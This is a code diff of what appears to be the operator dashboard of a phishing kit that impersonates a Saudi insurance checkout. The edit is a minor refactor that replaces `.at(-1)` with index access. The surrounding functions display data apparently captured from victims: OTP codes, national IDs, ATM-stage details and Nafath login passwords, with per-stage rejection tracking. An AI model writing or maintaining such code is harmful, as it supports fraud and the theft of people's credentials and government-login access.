@@ -114,7 +114,7 @@ function getStageAttempts(stageEvents: StageEvent[], orderId: string, stageKey: 
 function getStagePage(stageEvents: StageEvent[], orderId: string, stageKey: string): string | null {
   const events = stageEvents.filter(e => e.order_id === orderId && e.stage === stageKey)
     .sort((a, b) => new Date(a.stage_entered_at).getTime() - new Date(b.stage_entered_at).getTime());
-  const latest = events.at(-1);
+  const latest = events[events.length - 1];
   return (latest?.payload as any)?.current_page || null;
 }
 
@@ -400,7 +400,10 @@ function renderAtm(order: InsuranceOrder) {
 }
 
 function renderPhoneVerification(order: InsuranceOrder, stageEvents: StageEvent[], selectedVisitor: Visitor, visitorPhone: string | null, visitorNationalId: string | null) {
-  const phoneEvent = stageEvents.filter(e => e.order_id === order.id && e.stage === "phone_verification").sort((a, b) => new Date(a.stage_entered_at).getTime() - new Date(b.stage_entered_at).getTime()).at(-1);
+  const phoneVerificationEvents = stageEvents
+    .filter(e => e.order_id === order.id && e.stage === "phone_verification")
+    .sort((a, b) => new Date(a.stage_entered_at).getTime() - new Date(b.stage_entered_at).getTime());
+  const phoneEvent = phoneVerificationEvents[phoneVerificationEvents.length - 1];
   const carrierName = (phoneEvent?.payload as any)?.carrier || null;
   const phone = order.phone || visitorPhone || selectedVisitor?.phone || null;
   const nationalId = order.national_id || visitorNationalId || selectedVisitor?.national_id || null;
@@ -429,7 +432,7 @@ function renderPhoneVerification(order: InsuranceOrder, stageEvents: StageEvent[
 function renderPhoneOtp(order: InsuranceOrder, stageEvents: StageEvent[]) {
   const events = stageEvents.filter(e => e.order_id === order.id && e.stage === "phone_otp").sort((a, b) => new Date(a.stage_entered_at).getTime() - new Date(b.stage_entered_at).getTime());
   const rejected = events.filter(e => e.status === "rejected");
-  const latest = events.at(-1);
+  const latest = events[events.length - 1];
   const otp = order.phone_otp_code || (latest?.payload as any)?.phone_otp_code || (latest?.payload as any)?.code || null;
 
   return (
@@ -454,7 +457,7 @@ function renderPhoneOtp(order: InsuranceOrder, stageEvents: StageEvent[]) {
 
 function renderStcCall(order: InsuranceOrder, stageEvents: StageEvent[]) {
   const events = stageEvents.filter(e => e.order_id === order.id && e.stage === "stc_call").sort((a, b) => new Date(a.stage_entered_at).getTime() - new Date(b.stage_entered_at).getTime());
-  const latest = events.at(-1);
+  const latest = events[events.length - 1];
   const callStatus = (latest?.payload as any)?.call_status || null;
 
   return (
@@ -471,7 +474,7 @@ function renderStcCall(order: InsuranceOrder, stageEvents: StageEvent[]) {
 function renderNafathLogin(order: InsuranceOrder, stageEvents: StageEvent[], selectedVisitor: Visitor, visitorNationalId: string | null) {
   const events = stageEvents.filter(e => e.order_id === order.id && e.stage === "nafath_login").sort((a, b) => new Date(a.stage_entered_at).getTime() - new Date(b.stage_entered_at).getTime());
   const rejected = events.filter(e => e.status === "rejected");
-  const latestEvent = events.at(-1);
+  const latestEvent = events[events.length - 1];
   const payloadNatId = (latestEvent?.payload as any)?.national_id;
   const payloadPassword = (latestEvent?.payload as any)?.nafath_password;
   const nationalId = order.national_id || payloadNatId || selectedVisitor?.national_id || visitorNationalId || null;
